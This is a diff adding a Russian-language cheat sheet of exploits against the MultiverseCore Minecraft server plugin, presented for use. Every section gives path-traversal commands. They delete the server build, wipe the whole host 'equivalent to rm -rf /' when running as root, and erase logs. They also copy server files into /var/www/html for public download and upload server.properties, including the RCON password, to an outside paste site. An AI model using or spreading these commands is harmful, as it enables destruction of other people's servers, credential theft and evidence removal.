@@ -1,0 +1,46 @@
+MultiverseCore
+
+Способ 1 Удаление сборки (4.3.11)
+/mvcreate logs/../.daT normal
+/mvim logs/../ normal
+/mvdelete logs/../.daT
+/mvdelete logs/../
+/mvconfirm
+все мусорник успешно удален
+
+Удаление сборки (user/root)
+сносим полностью дедик (равноценно rm -rf /) работает только если сервер от рута
+/mvcreate logs/../../../../../../.daT
+/mvim logs/../../../../../../../
+/mvdelete logs/../../../../../../.daT
+/mvdelete logs/../../../../../../../
+/mvconfirm
+
+Удаление логов
+/mvcreate logs/.daT normal                                                 
+/mvim logs/ normal                                                         
+/mvdelete logs/
+
+Способ 2 Дамп файлов (Проверен)
+Требуется: Айпи бекэнда и открытый порт 443 (Можно проверить, законнектившись через браузер к айпишнику)
+Внимание: Исполнение данного дампа заставит сервер сильно залагать/упасть и способ полностью не проверялся.
+MultiverseCore 4.x.x
+/mvcreate logs/../test.daT normal
+/mvim world/../../ normal
+/mvclone world/../../ ../../../../../../var/www/html
+MultiverseCore 5.x
+/mvim logs/.. normal
+/mvclone logs/.. ../../../../../../var/www/html
+
+Читаем конфиги (5.х)
+server.properties
+/mv dumps --logs append --upload pastesdev
+дампит server.properties (включая ркон) и latest.log (можно читать логи)
+если выдает ошибку меняем источник пасты через флаги
+
+config.yml любого плагина:
+/mv import plugins/Multiverse-Core/ normal --skip-folder-check
+/mv import plugins/LuckPerms/ normal --skip-folder-check
+/mv delete plugins/Multiverse-Core/
+/mv clone plugins/LuckPerms/ plugins/Multiverse-Core/
+/mv dumps
